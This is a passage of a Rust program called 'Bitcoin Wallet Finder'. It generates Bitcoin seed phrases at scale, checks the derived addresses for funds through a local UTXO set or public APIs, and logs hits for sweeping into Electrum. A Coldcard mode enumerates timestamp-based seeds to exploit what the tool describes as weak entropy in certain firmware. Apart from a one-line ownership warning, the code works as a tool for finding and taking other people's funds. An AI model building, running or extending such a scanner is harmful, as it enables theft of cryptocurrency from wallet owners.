                      {DIM}blockstream+mempool+blockchain  \
                      Health:{hc}{BLD}{hp}%{RST}{BG}{DIM}(ok:{ok} err:{err}){ts}  \
                      200ms delay/call{RST}{BG}{Y}{:>p$}│{RST}",
                      "",p=inn.saturating_sub(82+if thr{12}else{0}));
        }
        let ckpt_n = std::fs::read_to_string(CHECKPOINT_FILE)
            .ok().and_then(|s| s.trim().parse::<u64>().ok()).unwrap_or(0);
        let ckpt_str = if ckpt_n>0 { format!("Saved:{}", fmt_n(ckpt_n)) }
                       else { "No checkpoint".into() };
        println!("{BG}│ {DIM}Keyspace:{M}{BLD}2¹²⁸{RST}{BG}{DIM}/2²⁵⁶  \
                  ~50M BTC wallets  Odds:{R}{BLD}1 in 6.8×10³¹{RST}{BG}  \
                  {G}{DIM}{ckpt_str}{RST}{BG}  \
                  {DIM}File:{CHECKPOINT_FILE}{RST}{BG}{Y}{:>p$}│{RST}",
                  "",p=inn.saturating_sub(90+ckpt_str.len()));

        println!("{BG}├{}┤{RST}","─".repeat(inn));
        println!("{BG}│ {BLD}{W}LIVE FEED{RST}{BG}  \
                  {DIM}P2PKH(1…)+P2SH(3…)  ★=HIT{RST}{BG}{Y}{:>p$}│{RST}",
                  "",p=inn.saturating_sub(48));
        println!("{BG}├{}┤{RST}","─".repeat(inn));

        if recent.is_empty() {
            println!("{BG}│ {DIM}Scanning...{RST}{BG}{Y}{:>p$}│{RST}","",p=inn.saturating_sub(14));
            for _ in 0..10{println!("{BG}│{:>p$}│{RST}","",p=inn.saturating_sub(1));}
        } else {
            let shown=recent.len();
            for e in &recent {
                let mk=if e.has_hit{format!("{BLD}{G}★ HIT!{RST}")}else{format!("{DIM}·{RST}")};
                let bl=if e.has_hit{format!("{BLD}{G}{:.6}BTC{RST}",e.sat as f64/1e8)}
                       else{format!("{DIM}0{RST}")};
                let p1=format!("{}..{}",&e.p2pkh[..6],&e.p2pkh[e.p2pkh.len()-6..]);
                let p2=format!("{}..{}",&e.p2sh[..6],&e.p2sh[e.p2sh.len()-6..]);
                let w6=e.words.iter().take(6).cloned().collect::<Vec<_>>().join(" ");
                let more=if e.words.len()>6{format!(" {DIM}+{}more{RST}",e.words.len()-6)}
                         else{String::new()};
                println!("{BG}│ {mk} {DIM}#{:>9}{RST}{BG} {Y}{p1}{RST}{BG}/{Y}{p2}{RST}{BG}  {bl}",e.n);
                println!("{BG}│     {DIM}Mne:{RST}{BG} {Y}{w6}{more}{RST}{BG}{Y}{:>p$}│{RST}",
                    "",p=inn.saturating_sub(w6.len()+20+if e.words.len()>6{8}else{0}));
            }
            for _ in shown..6{
                println!("{BG}│{:>p$}│{RST}","",p=inn.saturating_sub(1));
                println!("{BG}│{:>p$}│{RST}","",p=inn.saturating_sub(1));
            }
        }
        println!("{BG}{BLD}{Y}└{}┘{RST}","─".repeat(inn));
        let sp=["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];
        let ml=if local{"LOCAL"}else{"API"};
        print!(" {Y}{}{RST} BTC[{ml}]... {BLD}Ctrl+C{RST} │ Hits→{BLD}found.txt{RST} │ {Y}Electrum→Sweep{RST}",
            sp[(tick as usize)%sp.len()]);
        flush();
        set_title(&format!("₿[{ml}] Gen:{} {:.0}/s Chk:{} {:.0}/s Hits:{} ${:.2}",
            fmt_n(gc),gr,fmt_n(chk),cr,hits,usd));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  COLDCARD RUNNER  ██
// ─────────────────────────────────────────────────────────────────────────────

fn run_coldcard(btc_usd: f64, utxo: Option<Arc<UtxoSet>>) {
    let ts_start: u64 = 1_614_556_800; // 2021-03-01
    let ts_end:   u64 = 1_753_920_000; // 2026-07-31
    let ctr_max:  u16 = 4095;
    let total = (ts_end-ts_start) as u128 * (ctr_max as u128+1);

    clear();
    println!("{BLD}{Y}₿  COLDCARD MK3 WEAK-ENTROPY SCANNER{RST}");
    println!("{}", "─".repeat(60));
    println!("  Firmware:    v4.0.1 – v4.1.9 (affected)");
    println!("  Entropy:     128 bits → ~40 bits");
    println!("  Search space:{} combinations", fmt_n(total as u64));
    println!("  Time range:  2021-03-01 → 2026-07-31");
    println!("  Mode:        {}", if utxo.is_some(){"LOCAL UTXO (fast)"}else{"API (slow)"});
    println!("  Output:      coldcard_found.txt");
    println!();
    println!("  {R}Only scan wallets you own or have legal authority over.{RST}");
    println!();
    print!("  Press Enter to start, Ctrl+C to stop...");
    let _ = io::stdout().flush();
    let mut input=String::new(); let _ = io::stdin().read_line(&mut input);

    let stats  = Stats::new();
    let n_gen  = num_cpus::get().max(2);
    let n_chk  = std::env::var("CHECKERS").ok()
        .and_then(|s|s.parse().ok()).unwrap_or(num_cpus::get());
    let start  = Instant::now();
    let done   = Arc::new(AtomicBool::new(false));

    let (tx,rx) = bounded::<Wallet>(n_gen*4096);
    let mut handles = vec![];

    // Generator threads — partition timestamp range
    let chunk = (ts_end-ts_start) / n_gen as u64;
    for t in 0..n_gen {
        let tx2=tx.clone(); let s2=Arc::clone(&stats); let d2=Arc::clone(&done);
        let t0=ts_start+t as u64*chunk;
        let t1=if t+1==n_gen{ts_end}else{t0+chunk};
        handles.push(std::thread::spawn(move || {
            let secp=Secp256k1::new();
            'outer: for ts in t0..t1 {
                for ctr in 0..=ctr_max {
                    if let Some(w)=coldcard_wallet(&secp,ts,ctr) {
                        s2.generated.fetch_add(1,Ordering::Relaxed);
                        if tx2.send(w).is_err() { break 'outer; }
                    }
                }
            }
            d2.store(true,Ordering::Relaxed);
        }));
    }
    drop(tx);

    // Checker threads
    for _ in 0..n_chk {
        let rx2=rx.clone(); let s2=Arc::clone(&stats); let u2=utxo.clone();
        handles.push(std::thread::spawn(move || {
            loop {
                let w=match rx2.recv_timeout(Duration::from_millis(300)){
                    Ok(w)=>w, Err(_)=>{if rx2.is_empty(){break;}continue}
                };
                let (hit,_sat)=process_wallet(&w,&u2,&s2,btc_usd,"coldcard_found.txt");
                s2.checked.fetch_add(1,Ordering::Relaxed);
                if hit {
                    println!("  Date: {}  Counter: {}",ts_to_date(w.words.len() as u64),0);
                }
            }
        }));
    }
    drop(rx);

    // Status line
    {
        let s2=Arc::clone(&stats); let d2=Arc::clone(&done);
        std::thread::spawn(move || {
            loop {
                std::thread::sleep(Duration::from_secs(1));
                let sc=s2.checked.load(Ordering::Relaxed);
                let hits=s2.hits.load(Ordering::Relaxed);
                let usd=s2.usd_cents.load(Ordering::Relaxed) as f64/100.0;
                let ela=start.elapsed().as_secs_f64().max(0.001);
                let rate=sc as f64/ela;
                let pct=sc as f64/total as f64*100.0;
                let eta=if rate>0.0{
                    let s=((total as f64-sc as f64)/rate) as u64;
                    if s<3600{format!("{}m{}s",s/60,s%60)}
                    else if s<86400{format!("{}h{}m",s/3600,(s%3600)/60)}
                    else{format!("{}d{}h",s/86400,(s%86400)/3600)}
                }else{"∞".into()};
                print!("\r\x1b[2K  {Y}₿{RST}  Scanned:{W}{BLD}{}{RST} ({:.0}/s)  \
                       Progress:{pct:.4}%  Hits:{G}{BLD}{hits}{RST} (${usd:.2})  ETA:{eta}   ",
                    fmt_n(sc),rate);
                let _=io::stdout().flush();
                if d2.load(Ordering::Relaxed) && sc>=total as u64 {
                    println!("\n\n  {G}{BLD}Scan complete.{RST} {hits} hits → coldcard_found.txt");
                    break;
                }
            }
        });
    }

    for h in handles { let _ = h.join(); }
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  MAIN  ██
// ─────────────────────────────────────────────────────────────────────────────

fn main() {
    let mode = std::env::var("SCAN_MODE").unwrap_or_else(|_|"random".to_string());
    let coldcard = mode == "coldcard";
    let api_only = mode == "api";

    println!("{BLD}{Y}₿  Bitcoin Wallet Finder  — Single File Edition{RST}");
    println!();

    // Try to load local UTXO set (skip if SCAN_MODE=api)
    let utxo: Option<Arc<UtxoSet>> = if !api_only {
        match setup_utxo() {
            Some(s) => {
                println!("  {G}{BLD}✅ UTXO ready — {} funded addresses{RST}  \
                          (~{:.0} MB RAM)", fmt_n(s.len() as u64), s.len() as f64*28.0/1e6);
                Some(s)
            }
            None => {
                println!("  {Y}⚠  No local data — falling back to API mode{RST}");
                println!("  {DIM}Force API: SCAN_MODE=api cargo run --release{RST}");
                None
            }
        }
    } else {
        println!("  {Y}API mode (SCAN_MODE=api) — no local data needed{RST}");
        None
    };

    let local = utxo.is_some();
    let utxo_sz = utxo.as_ref().map(|u|u.len()).unwrap_or(0);

    if coldcard {
        let btc_usd = fetch_btc_price();
        run_coldcard(btc_usd, utxo);
        show_cursor();
        return;
    }

    println!("{DIM}Fetching BTC price...{RST}"); flush();
    let btc_usd = fetch_btc_price();
    let n_gen: usize = num_cpus::get().max(2);
    let n_chk: usize = std::env::var("CHECKERS").ok()
        .and_then(|s|s.parse().ok())
        .unwrap_or(if local{num_cpus::get()}else{4});

    // ── Load checkpoint BEFORE showing startup screen ────────────────────────
    let checkpoint = load_checkpoint();
    let env_start: u64 = std::env::var("START_FROM")
        .ok().and_then(|s| s.parse().ok()).unwrap_or(0);
    let start_from = checkpoint.max(env_start);

    println!();
    println!("  {BLD}BTC:     ${:.0}  |  {n_gen} gen  {n_chk} chk  |  {}  |  Hits→found.txt{RST}",
        btc_usd, if local{"LOCAL ~50k/sec"}else{"API ~8/sec"});
    println!("  {DIM}Coldcard mode: SCAN_MODE=coldcard cargo run --release{RST}");
    println!();

    // Show checkpoint info — stays visible for 4 seconds
    if checkpoint > 0 {
        println!("  {G}{BLD}✅ CHECKPOINT FOUND — Resuming from {:>12} wallets{RST}", checkpoint);
        println!("  {DIM}   File: {}  (auto-saved every 30s){RST}", CHECKPOINT_FILE);
    } else {
        println!("  {Y}No checkpoint found — starting from scratch{RST}");
        println!("  {DIM}   Checkpoint will be saved every 30s to: {}{RST}", CHECKPOINT_FILE);
    }
    if env_start > 0 {
        println!("  {Y}{BLD}START_FROM={env_start} — skipping first {env_start} wallets{RST}");
    }
    if start_from > 0 {
        println!("  {BLD}{Y}▶ Starting at counter: {start_from}{RST}");
    }
    println!();
    // Show info for 3 seconds — dashboard starts after this
    println!("  Starting scan in 3 seconds...  Ctrl+C to cancel");
    std::thread::sleep(Duration::from_secs(1));
    println!("  2...");
    std::thread::sleep(Duration::from_secs(1));
    println!("  1...");
    std::thread::sleep(Duration::from_secs(1));
    println!("  GO!");
    flush();
    // Small gap before dashboard takes over
    std::thread::sleep(Duration::from_millis(200));
    clear();
    hide_cursor();

    let stats=Stats::new();
    let log=RecentLog::new(6);
    let start=Instant::now();
    let (tx,rx)=bounded::<Wallet>(n_gen*4096);
    let mut handles=vec![];

    if start_from > 0 {
        // Initialise counters to start_from so dashboard shows real progress
        stats.generated.store(start_from, Ordering::Relaxed);
        stats.checked  .store(start_from, Ordering::Relaxed);
    }

    for idx in 0..n_gen {
        let tx2=tx.clone(); let s2=Arc::clone(&stats);
        let sf=start_from; let ng=n_gen;
        handles.push(std::thread::spawn(move||generator_thread(tx2,s2,sf,idx,ng)));
    }

    // Checkpoint saver thread — saves every 30 seconds
    {
        let s2=Arc::clone(&stats);
        std::thread::spawn(move || checkpoint_thread(s2));
    }
    drop(tx);

    for _ in 0..n_chk {
        let rx2=rx.clone(); let s2=Arc::clone(&stats);
        let l2=Arc::clone(&log); let u2=utxo.clone();
        handles.push(std::thread::spawn(move||checker_thread(rx2,s2,l2,u2,btc_usd)));
    }
    drop(rx);

    {
        let s2=Arc::clone(&stats); let l2=Arc::clone(&log);
        std::thread::spawn(move || {
            // Wait for countdown to finish before taking over the screen
            std::thread::sleep(Duration::from_millis(500));
            dashboard_thread(s2,l2,start,n_gen,n_chk,btc_usd,local,utxo_sz);
        });
    }

    for h in handles { let _ = h.join(); }
    show_cursor();
}

// ─────────────────────────────────────────────────────────────────────────────
// ██  TESTS  ██
// ─────────────────────────────────────────────────────────────────────────────
#[cfg(test)]
mod tests {
    use super::*;
    use bip39::{Language, Mnemonic, Seed};
    use secp256k1::Secp256k1;

    const MNE: &str = "abandon abandon abandon abandon abandon abandon \
                       abandon abandon abandon abandon abandon about";
    const ZOO: &str = "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong";

    fn s()->Secp256k1<secp256k1::All>{Secp256k1::new()}
    fn sb(m:&str)->Vec<u8>{
        Seed::new(&Mnemonic::from_phrase(m,Language::English).unwrap(),"")
            .as_bytes().to_vec()
    }

    #[test] fn p2pkh_known(){
        let k=btc_derive(&s(),&sb(MNE),44);
        assert_eq!(hex::encode(k),"e284129cc0922579a535bbf4d1a3b25773090d28c909bc0fed73b5e0222cc372");
        let (addr,_)=p2pkh_full(&s(),&k);
        assert_eq!(addr,"1LqBGSKuX5yYUonjxT5qGfpUsXKYYWeabA");
    }
    #[test] fn p2sh_known(){
        let k=btc_derive(&s(),&sb(MNE),49);
        assert_eq!(hex::encode(k),"508c73a06f6b6c817238ba61be232f5080ea4616c54f94771156934666d38ee3");
        let (addr,_)=p2sh_full(&s(),&k);
        assert_eq!(addr,"37VucYSaXLCAsxYyAPfbSi9eh4iEcbShgf");
    }
    #[test] fn p2pkh_zoo(){
        let k=btc_derive(&s(),&sb(ZOO),44);
        let (addr,_)=p2pkh_full(&s(),&k);
        assert_eq!(addr,"1EjnS13zBgN6tUgy6U64qFeh53fyAeUsqE");
    }
    #[test] fn hash160_roundtrip(){
        let k=btc_derive(&s(),&sb(MNE),44);
        let (addr,h)=p2pkh_full(&s(),&k);
        assert_eq!(addr_to_hash160(&addr), Some(h));
    }
    #[test] fn local_lookup(){
        let k=btc_derive(&s(),&sb(MNE),44);
        let (_,h)=p2pkh_full(&s(),&k);
        let mut utxo=HashSet::new(); utxo.insert(h);
        assert!(utxo.contains(&h));
    }
    #[test] fn coldcard_deterministic(){
        let e1=coldcard_entropy(1_614_556_800,42);
        let e2=coldcard_entropy(1_614_556_800,42);
        assert_eq!(e1,e2);
        assert_ne!(e1,coldcard_entropy(1_614_556_801,42));
    }
    #[test] fn all_mnemonics_valid(){
        let s=s();
        for i in 0u64..50{
            let w=gen_wallet(&s,i);
            Mnemonic::from_phrase(&w.words.join(" "),Language::English)
                .unwrap_or_else(|e|panic!("#{}:{}",i,e));
            assert!(w.btc_p2pkh.starts_with('1'));
            assert!(w.btc_p2sh .starts_with('3'));
        }
    }
    #[test] fn sat_math(){
        assert!((100_000_000u64 as f64/1e8-1.0).abs()<1e-10);
    }
}


